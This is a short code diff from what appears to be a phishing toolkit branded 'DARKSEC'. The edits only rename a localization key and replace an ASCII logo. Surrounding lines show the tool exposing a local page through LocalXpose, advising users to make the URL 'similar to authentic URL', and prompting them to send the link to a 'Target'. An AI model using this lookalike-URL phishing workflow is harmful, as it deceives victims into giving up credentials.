@@ -303,7 +303,7 @@ def start_localxpose(port):
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
         print(global_localization.line_of_dots)
-        print(localization.lang_start_localxpose["localxpose_random_server"])
+        print(localization.lang_rand_localxpose["localxpose_random_server"])
         run_command(
             [
                 "External_Software/loclx",
@@ -339,12 +339,8 @@ def start_localxpose(port):
 
     def custom(port):
 
-        print("""
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)"""
+        print(global_localization.small_logo)
+        print("""\n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)"""
               .format(default_palette[0], default_palette[2]))
         lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(
             default_palette[0], default_palette[2]))
@@ -362,7 +358,7 @@ def start_localxpose(port):
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------"""
+        {0}** BY:DARKSEC  \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------"""
                   .format(default_palette[0], default_palette[2]))
             print(
                 "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}"
